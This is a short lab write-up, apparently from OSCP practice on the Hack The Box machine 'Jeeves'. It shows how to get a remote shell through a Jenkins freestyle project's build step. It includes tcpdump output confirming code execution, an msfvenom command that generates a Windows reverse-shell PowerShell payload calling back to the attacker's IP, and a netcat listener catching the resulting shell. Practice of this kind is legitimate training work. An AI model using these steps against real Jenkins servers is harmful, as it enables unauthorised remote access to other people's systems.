# Jenkins
- Create a freesyle project
- Prove code execution first with ping
![[Pasted image 20220802132846.png]]

- Build project
![[Pasted image 20220802132950.png]]

- Recieve pings
```
┌──(kali㉿kali)-[~/oscp/boxes/htb/jeeves]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:28:54.523643 IP 10.10.10.63 > 10.10.14.8: ICMP echo request, id 1, seq 1, length 40
13:28:54.523690 IP 10.10.14.8 > 10.10.10.63: ICMP echo reply, id 1, seq 1, length 40
13:28:55.547911 IP 10.10.10.63 > 10.10.14.8: ICMP echo request, id 1, seq 2, length 40
13:28:55.547941 IP 10.10.14.8 > 10.10.10.63: ICMP echo reply, id 1, seq 2, length 40
13:28:56.488719 IP 10.10.10.63 > 10.10.14.8: ICMP echo request, id 1, seq 3, length 40
13:28:56.488736 IP 10.10.14.8 > 10.10.10.63: ICMP echo reply, id 1, seq 3, length 40
13:28:57.505824 IP 10.10.10.63 > 10.10.14.8: ICMP echo request, id 1, seq 4, length 40
13:28:57.505870 IP 10.10.14.8 > 10.10.10.63: ICMP echo reply, id 1, seq 4, length 40
```

- Create malicious powershell script
```
┌──(kali㉿kali)-[~/oscp/boxes/htb/jeeves]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=80 --format psh-cmd
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of psh-cmd file: 7319 bytes
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBm[...]MAKQA7AA==


```

- Change build action to malicious powershell script
![[Pasted image 20220802133224.png]]

- Build now and recieve shell
```
┌──(kali㉿kali)-[~/oscp/boxes/htb/jeeves]
└─$ nc -nvlp 80
Listening on 0.0.0.0 80
Connection received on 10.10.10.63 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins\workspace\EvilProject>
```